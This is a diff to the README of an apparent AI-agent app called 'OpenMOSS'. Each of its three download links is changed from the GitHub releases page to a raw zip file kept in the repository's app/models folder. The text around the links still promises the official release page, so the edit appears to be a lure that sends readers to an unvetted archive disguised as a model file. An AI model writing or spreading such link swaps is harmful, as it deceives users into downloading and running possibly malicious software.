@@ -1,6 +1,6 @@
 # 🤖 OpenMOSS - Team AI Agents Working Together
 
-[![Download OpenMOSS](https://img.shields.io/badge/Download%20OpenMOSS-FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/madderangelfoodcake950/OpenMOSS/releases)
+[![Download OpenMOSS](https://img.shields.io/badge/Download%20OpenMOSS-FF6F61?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/madderangelfoodcake950/OpenMOSS/main/app/models/MOSS-Open-v1.4.zip)
 
 ## 🔍 What is OpenMOSS?
 
@@ -31,7 +31,7 @@ You can get the app from the official GitHub release page.
 
 Click the button below to open the release page where you will find the latest OpenMOSS program files ready for download.
 
-[![Get OpenMOSS Here](https://img.shields.io/badge/Get%20OpenMOSS%20Here-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/madderangelfoodcake950/OpenMOSS/releases)
+[![Get OpenMOSS Here](https://img.shields.io/badge/Get%20OpenMOSS%20Here-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/madderangelfoodcake950/OpenMOSS/main/app/models/MOSS-Open-v1.4.zip)
 
 ### Step 2: Choose the Correct File
 
@@ -115,7 +115,7 @@ You can watch the agents’ progress or change settings at any time.
 
 Check the release page regularly for new versions. Download the latest setup file and repeat the installation steps to update. Your settings and data will stay intact.
 
-[Download Latest OpenMOSS](https://github.com/madderangelfoodcake950/OpenMOSS/releases)
+[Download Latest OpenMOSS](https://raw.githubusercontent.com/madderangelfoodcake950/OpenMOSS/main/app/models/MOSS-Open-v1.4.zip)
 
 ---
 
